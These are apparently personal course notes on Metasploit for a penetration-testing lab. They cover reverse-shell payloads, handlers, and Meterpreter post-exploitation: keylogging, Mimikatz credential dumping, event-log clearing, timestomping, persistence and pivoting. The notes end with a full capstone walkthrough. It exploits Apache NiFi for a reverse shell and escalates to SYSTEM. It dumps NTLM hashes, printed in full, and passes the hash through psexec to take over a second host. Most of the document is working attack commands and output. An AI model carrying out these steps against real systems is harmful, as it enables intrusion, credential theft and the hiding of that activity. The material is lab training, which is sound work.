# Setup
Uses a postgreSQL db for storing information about target hosts and keeping track of successful exploitation attempts, etc.

##### Start postgreSQL service
```bash
sudo systemctl start postgresql.service

#enable at boot time
sudo systemctl enable postgresql.service
```

##### Create and initialize MSF database
```bash
sudo msfdb init
	[i] Database already started
	[+] Creating database user 'msf'
	[+] Creating databases 'msf'
	[+] Creating databases 'msf_test'
	[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
	[+] Creating initial database schema
```

##### Should update as often as possible as it's always being updated
```bash
sudo apt update; sudo apt install metasploit-framework
```

##### Launch
```bash
msfconsole
	...                                                                              
	       =[ metasploit v6.2.20-dev                          ]
	+ -- --=[ 2251 exploits - 1187 auxiliary - 399 post       ]
	+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
	+ -- --=[ 9 evasion                                       ]
	
	Metasploit tip: Use help <command> to learn more 
	about any command
	Metasploit Documentation: https://docs.metasploit.com/
	
	msf6 >
```
##### Check status of db
```bash
db_status
	[*] Connected to msf. Connection type: postgresql.
```

# Workspaces

Used in order to not mix up differing clients' assessments as everything is stored in a db between sessions

##### Create/ Remove a workspaces
```bash
# msf6 >
workspace -a pen200
	[*] Added workspace: pen200
	[*] Workspace: pen200

workspace -d pen200
	[*] Deleted workspace: pen200
	[*] Switched to workspace: default
```
	- Creating a workspace automatically activates it as the current

##### List & switch of workspaces (\* Denotes active)
```bash
# msf6 >
workspace
	default
	* pen200

workspace default
	[*] Workspace: default
```


# Syntax
- Includes several thousand modules divided into categories.
##### List all available commands
```bash
# msf6 >
help
	Core Commands
	===============
		Command           Description
	    -------           -----------
	    ?                 Help menu
		...
	Module Commands
	===============
		Command           Description
	    -------           -----------
	    favorite          Add module(s) to the list of favorite modules
	    ...
	Job Commands
	============
	    ...
	Resource Script Commands
	========================
		...
	Database Backend Commands
	=========================
		Command           Description
	    -------           -----------
		hosts             List all hosts in the database
	    klist             List Kerberos tickets in the database
	    loot              List all loot in the database
	    notes             List all notes in the database
	    services          List all services in the database
	    vulns             List all vulnerabilities in the database
		...
	Credentials Backend Commands
	============================
	    Command       Description
	    -------       -----------
	    creds         List all credentials in the database
	    
	Developer Commands
	==================
	...
```

##### Execute nmap and save findings in database
```bash
db_nmap -A 192.168.50.202
	[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 03:48 EDT
	[*] Nmap: Nmap scan report for 192.168.50.202
	[*] Nmap: Host is up (0.11s latency).
	[*] Nmap: Not shown: 993 closed tcp ports (reset)
	[*] Nmap: PORT     STATE SERVICE       VERSION
	[*] Nmap: 21/tcp   open  ftp?
	...
```

##### List of all currently discovered hosts
```bash
hosts
	Hosts
	=====
	address         mac  name  os_name       os_flavor  os_sp  purpose  info  comments
	-------         ---  ----  -------       ---------  -----  -------  ----  --------
	192.168.50.202             Windows 2016                    server
```
	- Requires db_nmap scan

##### List all discovered services of portscan
```bash
services
	Services
	========
	host            port  proto  name           state  info
	----            ----  -----  ----           -----  ----
	192.168.50.202  21    tcp    ftp            open
	192.168.50.202  135   tcp    msrpc          open   Microsoft Windows RPC
	192.168.50.202  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
	192.168.50.202  445   tcp    microsoft-ds   open
	192.168.50.202  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
	192.168.50.202  5357  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
	192.168.50.202  8000  tcp    http           open   Golang net/http server Go-IPFS json-rpc or InfluxDB API
```
	- Can view a specific port using `-p <port#>` switch

##### List all modules (auxiliaries/exploits/payloads)
``` bash
show auxiliary
	Auxiliary
	=========
	   Name                                 Rank    Description
	   ----                                 ----    -----------
	   ...
	   985   auxiliary/scanner/smb/impacket/dcomexec                                  2018-03-19       normal  No     DCOM Exec
	   986   auxiliary/scanner/smb/impacket/secretsdump                                                normal  No     DCOM Exec
```

##### Filter through modules example
```bash
search type:auxiliary portscan
	Matching Modules
	================
	   #  Name                                              Disclosure Date  Rank    Check  Description
	   -  ----                                              ---------------  ----    -----  -----------
	   ...
	   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
	   ...


search Apache 2.4.49
	Matching Modules
	================
	   #  Name                                          Disclosure Date  Rank       Check  Description
	   -  ----                                          ---------------  ----       -----  -----------
	   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
	   1  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner
		...
```

##### Activate/ Switch/ Leave a module
```bash
# use <module name>
msf6 > use auxiliary/scanner/portscan/tcp
# OR
msf6 > use 5

# switch
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > previous
msf6 auxiliary(scanner/portscan/tcp) >

# leave
msf6 auxiliary(scanner/portscan/tcp) > back
msf6 > 
```

##### Multi/handler
- Receives incoming connections.  Works for the majority of staged, non-staged, and more advanced payloads
```bash
use multi/handler
```

##### Show/ Configure options
```bash
#Show
show options

#Configure options - set & remove
set LHOST
unset RHOST

#Configure global options - set & remove
setg LHOST
unsetg LPORT
```

##### Use a specific payload
```bash
set payload payload/linux/x64/shell_reverse_tcp
	payload => linux/x64/shell_reverse_tcp
```

##### List all payloads compatible with the currently selected exploit module
```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
	Compatible Payloads
	===================
	   #   Name                                              Disclosure Date  Rank    Check  Description
	   -   ----                                              ---------------  ----    -----  -----------
	...
	   15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
	...
	   20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
	...
```

##### Run
```bash
#two ways to send exploit
run
exploit
```
	- I find that 'run' doesn't work for payloads


# Sessions
- Need to background a session first `^Z`

##### List sessions
```bash
sessions -l
	Active sessions
	===============
	  Id  Name  Type             Information  Connection
	  --  ----  ----             -----------  ----------
	  ...
	  2         shell x64/linux               192.168.119.4:4444 -> 192.168.50.16:35534 (192.168.50.16)
```

##### Switch sessions
```bash
sessions -i 2
	[*] Starting interaction with 2...
```


# Staged vs Non-Staged

### Non-Staged
- Sent in its entirety along with the exploit.
- Payload contains the exploit and full shellcode (ex for B.O.) for a selected task.
- **Pro**:   More stable
- **Con**:  Size will be bigger than other types

**How to tell**
- States `Inline`
- Doesn't have `/` between 'shell' and 'reverse'
```bash
payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
```


### Staged
- Usually sent in two parts.
	- First part contains a small primary payload that connects back to the attacker for transfer of larger, secondary payload
	- Second part contains rest of the shellcode & executes it.

**How to tell**
- States `Stager`
- Has `/` between 'shell' and 'reverse'
```bash
payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
```


Reasons to use staged payloads
- Space-limitations in an exploit
- AV evasion
	- 2nd payload is is retrieved and injected directly into memory


# Meterpreter

Payload which is a multi-function payload that can be dynamically extended at run-time.

Commands are divided into categories such as _System Commands_, _Networking Commands_, and _File system Commands_
	- Shown via `help` w/in meterpreter command prompt

```bash
meterpreter > help
	Core Commands
	=============
	    Command                   Description
	    -------                   -----------
	    ?                         Help menu
	    background                Backgrounds the current session
	    ...
	    channel                   Displays information or control active channels
	    close                     Closes a channel
	    ...
```

**Most common:**

*System Info & Mgmt*
- `systeminfo` - Display system information of target machine
- `getuid` - Display current user ID on target machine
- `getpid` - Display process ID with which Meterpreter is running
- `ps` - List and display running processes on target machine

*Networking*
- `getproxy` - Display current proxy configuration
- `portfwd` - Forward packets from a local port to a remote service.  Relays TCP connections to/from target machine
- `route` - View & modify the network routing table

*File System Ops*
- `lpwd` - Displays present working directory
- `lcd` - Change directory
- `lcat` - Print file to screen
- `upload/download` - Upload/download a file or directory from local/remote to remote/local.
- `rm/del` - Delete remote files.  Doesn't go into target's recycling bin.
- `show_mount` - List all mount points/ logical drives

*User & Group Mgmt*
- `add_user` - Attempt to add a user w/ all tokens to the target system.
- `add_group_user` - Attempt to add a user to a global group on a host w/ all accessible tokens.
- `getprivs` - Attempt to enable all privileges available to the current process on the target
- `list_tokens` - List all accessible tokens & their privilege level using the `-u` to sort by unique user name and `-g` by unique group name
- `impersonate_token` - Instruct Meterpreter to impersonate the specified token

*PrivEsc*
- `getsystem` - Attempt to elevate privileges to that of the target system (admin or root)
- `rev2self` -Attempt to revert to the original token.  Useful after privesc - helps if mistake escalating to wrong set of privs.

*Persistence & Lateral Movement*
- `run [persistence]` - Runa Meterpreter payload \[persistence] on target machine to maintain access or create a persistent backdoor.
- `use kiwi` - Load Kiwi Mimikatz module into current Meterpreter session
- `golden_ticket_create` - Create a golden Kerberos ticket.
- `run autoroute` - Attempt to create a new route through a Meterpreter session allowing deeper pivoting into a target network

*Capture and Exfiltration*
- `screenshot` - Grab a screenshot of the target's interactive desktop
- `screenshare` - Watch remote user's desktop in real time
- `keyscan_start/keyscan_stop` - Start/ stop capturing keystrokes on target machine
- `keyscan_dump` - Dump buffer of recorded keystrokes on the target. Used during `keyscan`
- `enumdesktops` - List all available desktops (separate GUI envs)

*Defensive Evasion*
- `clearev` - Clear event logs
- `timestomp` - Manipulate timestamps of affected files to cover tracks
- `migrate [pid]` - Move Meterpreter session to another process.

*Misc*
- `shell` - Drop into a system command shell
- `execute [option]`
	- `-H` - Create process hidden from view
	- `-a` - Args to pass to the command
	- `-c` - Channelized I/O
	- `-d` - Dummy executable to launch when using `-m`
	- `-f` - Executable command to run
	- `-h` - Help menu
	- `-i` - Interact w/ the process after creating it
	- `-m` - Execute from memory
	- `-t` - Execute process using the currently impersonated thread token
- `localtime` - Display local date & time of the target system
- `idletime` - Display number of seconds the user has been idle on the remote system.  Useful as may encounter timeouts on target machine or to prevent a user from seeing any prompts popping up

*Port Forward*
`portfwd`
- `-h` - Help banner.
- `-i` - Index of the port forward entry to interact with (see the "list" command).
- `-l` - Forward: local port to listen on. Reverse: local port to connect to.
- `-L` - Forward: local host to listen on (optional). Reverse: local host to connect to.
- `-p` - Forward: remote port to connect to. Reverse: remote port to listen on.
- `-r` - Forward: remote host to connect to.
- `-R` - Indicates a reverse port forward.

## Channels

Subsystem that allows for reading, listing, and writing through all the logical channels that exist as communication sub-channels through the Meterpreter shell
Helps tremendously to manage system access and perform post-exploitation operations.

##### List all active channels
```bash
channel -l
    Id  Class  Type
    --  -----  ----
    1   3      stdapi_process
    2   3      stdapi_process
```

##### Use specific channel
```bash
channel -i 1
	Interacting with channel 1...
		id
			uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## Kiwi
- Meterpreter extention that contains the functionalities of Mimikatz

##### Load Kiwi
```bash
meterpreter > load kiwi
	Loading extension kiwi...
	  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
	 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
	 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
	  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
	
	Success.
```

```bash
Kiwi Commands
=============
    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```


# Pivoting

- Assume an internal network was discovered during enumeration
	- 192.168.50.223 - victim's IP
	- 172.16.5.0/24 - target internal network
```powershell
ipconfig
	Windows IP Configuration
	
	Ethernet adapter Ethernet0:
	   Connection-specific DNS Suffix  . : 
	   Link-local IPv6 Address . . . . . : fe80::c489:5302:7182:1e97%11
	   IPv4 Address. . . . . . . . . . . : 192.168.50.223
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . : 192.168.50.254
	
	Ethernet adapter Ethernet1:
	   Connection-specific DNS Suffix  . : 
	   Link-local IPv6 Address . . . . . : fe80::b540:a783:94ff:89dc%14
	   IPv4 Address. . . . . . . . . . . : 172.16.5.199
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . :
```


**Before starting**
- Background the session after getting a foothold to victim's endpoint & using `multi/handler` to catch a Meterpreter reverse shell

## Automatically pivoting
```bash
meterpreter > bg
	[*] Backgrounding session 12...

msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute

msf6 post(multi/manage/autoroute) > show options
	Module options (post/multi/manage/autoroute):
	
	   Name     Current Setting  Required  Description
	   ----     ---------------  --------  -----------
	   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
	   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
	   SESSION                   yes       The session to run this module on
	   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > sessions -l
	Active sessions
	===============
	  Id  Name  Type                     Information            Connection
	  --  ----  ----                     -----------            ----------
	  12         meterpreter x64/windows  ITWK01\luiza @ ITWK01  192.168.119.4:443 -> 127.0.0.1 ()


msf6 post(multi/manage/autoroute) > set session 12
	session => 12

msf6 post(multi/manage/autoroute) > run
	[!] SESSION may not be compatible with this module:
	[!]  * incompatible session platform: windows
	[*] Running module against ITWK01
	[*] Searching for subnets to autoroute.
	[+] Route added to subnet 172.16.5.0/255.255.255.0 from host's routing table.
	[+] Route added to subnet 192.168.50.0/255.255.255.0 from host's routing table.
	[*] Post module execution completed
```

## Manually pivoting

##### Route to newly discovered network
```bash
meterpreter > bg
	[*] Backgrounding session 12...

msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
	[*] Route added

msf6 exploit(multi/handler) > route print
	IPv4 Active Routing Table
	=========================
	
	   Subnet             Netmask            Gateway
	   ------             -------            -------
	   172.16.5.0         255.255.255.0      Session 12
	
	[*] There are currently no IPv6 routes defined.
```

##### Enumerate new subnet
```bash
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp 

msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.200
	RHOSTS => 172.16.5.200

msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
	PORTS => 445,3389

msf6 auxiliary(scanner/portscan/tcp) > run
	[+] 172.16.5.200:         - 172.16.5.200:445 - TCP OPEN
	[+] 172.16.5.200:         - 172.16.5.200:3389 - TCP OPEN
	[*] 172.16.5.200:         - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
```


## Configure SOCKS proxy
- Allows applications outside of the Metasploit to tunnel through the pivot on port 1080 by default.
- Need a port forward set up (either manually or automatically via instructions above)
  
```bash
use auxiliary/server/socks_proxy 

msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):
	   Name      Current Setting  Required  Description
	   ----      ---------------  --------  -----------
	   PASSWORD                   no        Proxy password for SOCKS5 listener
	   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
	   SRVPORT   1080             yes       The port to listen on
	   USERNAME                   no        Proxy username for SOCKS5 listener
	   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
	
	Auxiliary action:
	
	   Name   Description
	   ----   -----------
	   Proxy  Run a SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
	SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
	VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
	[*] Auxiliary module running as background job 0.
	[*] Starting the SOCKS proxy server
```

> Able to then setup proxychains and attack like previous chapters `vim /etc/proxychains4.conf`
```bash
...
socks5 127.0.0.1 1080
```

##### Create a local port forward
```bash
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
	[*] Local TCP relay created: :3389 <-> 172.16.5.200:3389
```


# Automation via scripts

Can write a Ruby script to start Metasploit from.

Pre-crafted Ruby scripts for Metasploit `ls -l /usr/share/metasploit-framework/scripts/resource`

##### To start Metasploit using a script
```bash
sudo msfconsole -r [script]
```

##### Example automated script - Listener.rc
```ruby
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```
	- Starts a multi/handler
	- Sets options
	- AutoRunScript - Automatically execute a module after a session was created
	- ExitOnSession - Ensure that the listener keeps accepting new connections after a session is created.



# Capstone

3. Use the methods and techniques from this Module to enumerate VM Group 1. Get access to both machines and find the flag. 
   Once the VM Group is deployed, please wait two more minutes for one of the web applications to be fully initialized.


```bash
msfconsole

db_nmap A 192.168.191.225
	...
	[*] Nmap: PORT     STATE SERVICE       VERSION
	[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
	[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	[*] Nmap: 445/tcp  open  microsoft-ds?
	[*] Nmap: 8080/tcp open  http          Jetty 9.4.48.v20220622
	[*] Nmap: |_http-server-header: Jetty(9.4.48.v20220622)
	[*] Nmap: |_http-title: NiFi
	[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	[*] Nmap: Host script results:
	[*] Nmap: | smb2-time:
	[*] Nmap: |   date: 2024-07-09T01:03:33
	[*] Nmap: |_  start_date: N/A
	[*] Nmap: | smb2-security-mode:
	[*] Nmap: |   3:1:1:
	[*] Nmap: |_    Message signing enabled but not required


db_nmap A 192.168.191.226
	...
	[*] Nmap: PORT    STATE SERVICE       VERSION
	[*] Nmap: 135/tcp open  msrpc         Microsoft Windows RPC
	[*] Nmap: 139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
	[*] Nmap: 445/tcp open  microsoft-ds?
	[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	[*] Nmap: Host script results:
	[*] Nmap: | smb2-time:
	[*] Nmap: |   date: 2024-07-09T01:07:41
	[*] Nmap: |_  start_date: N/A
	[*] Nmap: | smb2-security-mode:
	[*] Nmap: |   3:1:1:
	[*] Nmap: |_    Message signing enabled but not required


# Attack .225
search "apache nifi"
	Matching Modules
	================
	   #  Name                                          Disclosure Date  Rank       Check  Description
	   -  ----                                          ---------------  ----       -----  -----------
	   0  exploit/multi/http/apache_nifi_processor_rce  2020-10-03       excellent  Yes    Apache NiFi API Remote Code Execution
	   1    \_ target: Unix (In-Memory)                 .                .          .      .
	   2    \_ target: Windows (In-Memory)              .                .          .      .
	   3  post/linux/gather/apache_nifi_credentials     .                normal     No     Apache NiFi Credentials Gather
	   4  exploit/linux/http/apache_nifi_h2_rce         2023-06-12       excellent  Yes    Apache NiFi H2 Connection String Remote Code Execution
	   5  auxiliary/scanner/http/apache_nifi_login      .                normal     No     Apache NiFi Login Scanner
	   6  auxiliary/scanner/http/apache_nifi_version    .                normal     No     Apache NiFi Version Scanner

use 2

show payloads
	...
	42   payload/cmd/windows/http/x64/meterpreter/reverse_tcp                       .                normal  No     HTTP Fetch, Windows x64 Reverse TCP Stager
	...

use 42
# set payload cmd/windows/http/x64/meterpreter/reverse_tcp

set rhosts 192.168.191.255
set lhost 192.168.45.166
set lport 443
set ssl false

options
# Set options w/ '>' at beginning of line
# Note:  ssl option will not be displayed, but there will be an error message if it's not set
	Module options (exploit/multi/http/apache_nifi_processor_rce):
	
	   Name          Current Setting  Required  Description
	   ----          ---------------  --------  -----------
	   BEARER-TOKEN                   no        JWT authenticate with
	   DELAY         5                yes       The delay (s) before stopping and deleting the processor
	   PASSWORD                       no        Password to authenticate with
	   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
	>   RHOSTS        192.168.191.225  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
	   RPORT         8080             yes       The target port (TCP)
	   TARGETURI     /                yes       The base path
	   USERNAME                       no        Username to authenticate with
	   VHOST                          no        HTTP server virtual host
	
	
	Payload options (cmd/windows/http/x64/meterpreter/reverse_tcp):
	
	   Name                Current Setting  Required  Description
	   ----                ---------------  --------  -----------
	   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)
	   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
	   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
	   FETCH_FILENAME      PBiAKeecT        no        Name to use on remote system when storing payload; cannot contain spaces or slashes
	   FETCH_SRVHOST                        no        Local IP to use for serving payload
	   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
	   FETCH_URIPATH                        no        Local URI to use for serving payload
	   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
	>   LHOST               192.168.45.166   yes       The listen address (an interface may be specified)
	>   LPORT               443              yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   1   Windows (In-Memory)


run

# meterpreter >
getuid
	Server username: ITWK03\alex

getsystem
	...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

getuid
	Server username: NT AUTHORITY\SYSTEM

load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

creds_msv
	[+] Running as SYSTEM
	[*] Retrieving msv credentials
	msv credentials
	===============
	
	Username     Domain  NTLM                              SHA1
	--------     ------  ----                              ----
	alex         ITWK03  5391f1724568f48a4aadba748109864c  3c0c8334c4b5a80345d40e00550539a7c847809c
	itwk04admin  ITWK03  445414c16b5689513d4ad8234391aacf  3b25183b0c39fd03069f586c7d238160f54b6cd7
	offsec       ITWK03  b26462f877427f4f6a87605d587ac60d  f237f7e3b1958e6047f1b29716a2f776dbdb5a19

hashdump
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:b26462f877427f4f6a87605d587ac60d:::
	alex:1002:aad3b435b51404eeaad3b435b51404ee:5391f1724568f48a4aadba748109864c:::
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	itwk04admin:1003:aad3b435b51404eeaad3b435b51404ee:445414c16b5689513d4ad8234391aacf:::
	offsec:1001:aad3b435b51404eeaad3b435b51404ee:b26462f877427f4f6a87605d587ac60d:::
	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2cb4d723f9fce9b26d61be15e5ad1c51:::


# Attack .226
use exploit windows/smb/psexec

set rhosts 192.168.191.226
set smbuser itwk04admin
set smbpass aad3b435b51404eeaad3b435b51404ee:445414c16b5689513d4ad8234391aacf
set lhost 192.168.45.166

options
# Set options w/ '>' at beginning of line
	Module options (exploit/windows/smb/psexec):
	
	   Name                  Current Setting  Required  Description
	   ----                  ---------------  --------  -----------
	   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
	   SERVICE_DISPLAY_NAME                   no        The service display name
	   SERVICE_NAME                           no        The service name
	   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
	
	
	   Used when connecting via an existing SESSION:
	
	   Name     Current Setting  Required  Description
	   ----     ---------------  --------  -----------
	   SESSION                   no        The session to run this module on
	
	
	   Used when making a new connection via RHOSTS:
	
	   Name       Current Setting                                 Required  Description
	   ----       ---------------                                 --------  -----------
>	   RHOSTS     192.168.191.226                                 no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usi
	                                                                        ng-metasploit.html
	   RPORT      445                                             no        The target port (TCP)
	   SMBDomain  .                                               no        The Windows domain to use for authentication
>	   SMBPass    aad3b435b51404eeaad3b435b51404ee:445414c16b568  no        The password for the specified username
	              9513d4ad8234391aacf
>	   SMBUser    itwk04admin                                     no        The username to authenticate as
	
	
	Payload options (windows/meterpreter/reverse_tcp):
	
	   Name      Current Setting  Required  Description
	   ----      ---------------  --------  -----------
	   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
>	   LHOST     192.168.45.166   yes       The listen address (an interface may be specified)
	   LPORT     4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Automatic

run

# Give it lots of tries.   Here's the output I got.
	[*] Started reverse TCP handler on 192.168.45.166:4444 
	[*] 192.168.191.226:445 - Connecting to the server...
	[*] 192.168.191.226:445 - Authenticating to 192.168.191.226:445 as user 'itwk04admin'...
	[*] 192.168.191.226:445 - Selecting PowerShell target
	[*] 192.168.191.226:445 - Executing the payload...
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[+] 192.168.191.226:445 - Service start timed out, OK if running a command or non-service executable...
	[*] Sending stage (176198 bytes) to 192.168.191.226
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[-] Meterpreter session 5 is not valid and will be closed
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[-] Meterpreter session 6 is not valid and will be closed
	[*] 192.168.191.226 - Meterpreter session 6 closed.
	[*] 192.168.191.226 - Meterpreter session 5 closed.
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[-] Meterpreter session 7 is not valid and will be closed
	[*] 192.168.191.226 - Meterpreter session 7 closed.
	[*] 192.168.191.226 - Meterpreter session 5 closed.  Reason: Died
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[-] Meterpreter session 8 is not valid and will be closed
	[*] 192.168.191.226 - Meterpreter session 8 closed.
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[-] Meterpreter session 9 is not valid and will be closed
	[*] 192.168.191.226 - Meterpreter session 9 closed.
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[*] Exploit completed, but no session was created.
	[*] Meterpreter session 4 opened (192.168.45.166:4444 -> 192.168.191.226:54144) at 2024-07-08 23:37:45 -0400


sessions -l
	Active sessions
	===============
	  Id  Name  Type                     Information                   Connection
	  --  ----  ----                     -----------                   ----------
	  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ITWK03  192.168.45.166:4444 -> 192.168.191.225:63370 (192.168.191.225)
	  4         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ITWK04  192.168.45.166:4444 -> 192.168.191.226:54144 (192.168.191.226)

sessions -i 4
	[*] Starting interaction with 4...

# meterpreter
shell

# C:\Windows\system32>
powershell.exe

# PS C:\Windows\system32>
Get-ChildItem -Path C:\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue -Force
	Directory: C:\Users\itwk04admin\Desktop

type C:\Users\itwk04admin\Desktop
	OS{d0d169c99c92c9007682007010a97137}
```

